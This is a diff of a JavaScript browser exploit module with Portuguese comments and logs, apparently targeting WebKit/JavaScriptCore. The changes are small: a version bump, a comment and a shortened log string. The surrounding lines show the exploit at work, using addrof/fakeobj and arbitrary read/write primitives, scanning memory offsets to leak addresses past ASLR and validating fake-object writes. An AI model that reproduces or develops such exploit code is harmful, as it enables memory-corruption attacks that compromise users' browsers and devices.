@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v123 - R60 Final com Vazamento de ASLR via ArrayBuffer m_vector e Correção de Sintaxe)
+// js/script3/testArrayBufferVictimCrash.mjs (v124 - R60 Final com Vazamento de ASLR via ArrayBuffer m_vector e REVISÃO DE SINTAXE CRÍTICA)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA TODAS AS PRIMITIVAS (ADDROF/FAKEOBJ, ARB_READ/ARB_WRITE) DO core_exploit.mjs para maior estabilidade e clareza.
@@ -27,7 +27,7 @@ import {
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v123_R60_ASLR_LEAK_ARRAYBUFFER_MVECTOR_FIX"; // Renamed for new strategy
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v124_R60_ASLR_LEAK_ARRAYBUFFER_MVECTOR_S_FIX"; // Renamed for new strategy
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -113,7 +113,7 @@ async function scanForRelevantPointersAndLeak(logFn, pauseFn, JSC_OFFSETS_PARAM,
             } catch (e_scan) {
                 logFn(`[SCANNER] ERRO ao ler no offset 0x${offset.toString(16)}: ${e_scan.message}`, "error", FNAME);
             }
-        }
+        } // End of for loop
 
     logFn(`[SCANNER] Varredura de offsets concluída.`, "subtest", FNAME);
     return scan_results;
@@ -128,7 +128,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
 
-    try { // <<<<<<<<<< LINHA 117 NO ÚLTIMO LOG
+    try { // <<<<<<<<<< LINHA 113 NO ÚLTIMO LOG DE ERRO (DEVE SER OK AGORA)
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
 
@@ -318,7 +318,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
             logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, 'good');
         } else {
-            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Lido via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
+            logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read: ${toHex(read_back_val_prop)}.`, "error");
             throw new Error("R/W verification post-ASLR leak failed.");
         }
 
